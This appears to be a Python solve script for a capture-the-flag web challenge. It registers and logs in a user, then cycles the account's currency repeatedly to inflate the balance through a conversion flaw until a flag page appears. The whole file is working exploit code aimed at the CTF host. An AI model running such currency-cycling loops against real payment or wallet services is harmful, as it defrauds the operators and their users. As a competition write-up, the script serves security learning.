import requests
import time
import re

BASE_URL = "http://ctf.compfest.id:7303"


def register_user(username, password):
    session = requests.Session()
    session.get(f"{BASE_URL}/register")
    data = {"username": username, "password": password, "confirm_password": password}
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"[+] Register response: {response.status_code}")
    return session


def login_user(session, username, password):
    session.get(f"{BASE_URL}/login")
    data = {"username": username, "password": password}
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"[+] Login response: {response.status_code}")
    return session


def change_currency(session, currency):
    data = {"currency": currency}
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"[~] Change currency to {currency}: {response.status_code}")
    return session


def check_balance(session):
    response = session.get(f"{BASE_URL}/")
    match = re.search(r"Balance:\s*([\d.]+)\s*([A-Z]+)", response.text)
    if match:
        balance, currency = match.groups()
        print(f"[ðŸ’°] Balance: {balance} {currency}")
        return float(balance), currency
    return None, None


def check_rich(session):
    response = session.get(f"{BASE_URL}/are-you-rich")
    if response.status_code == 200:
        if "FLAG" in response.text or "FAKE{" in response.text:
            print("\nðŸŽ‰ FLAG FOUND ðŸŽ‰")
            print(response.text)
            return True
    return False


def exploit_currency_loop():
    username = f"exploit_{int(time.time())}"
    password = "p@ssw0rd123"

    print(f"\n[!] Starting exploit with user: {username}")
    session = register_user(username, password)
    login_user(session, username, password)

    # Loop eksploitasi currency
    loop_sequence = ["IDR", "JPY", "KRW", "IDR"]
    iterations = 50

    for i in range(iterations):
        print(f"\n=== Iteration {i+1} ===")
        for currency in loop_sequence:
            change_currency(session, currency)
            check_balance(session)
            if check_rich(session):
                return

    # Final set ke GBP
    print("\n[*] Setting final currency to GBP...")
    change_currency(session, "GBP")
    check_balance(session)

    check_rich(session)


if __name__ == "__main__":
    print("=== CURRENCY LOOP EXPLOIT STARTED ===")
    print(f"Target URL: {BASE_URL}")
    exploit_currency_loop()
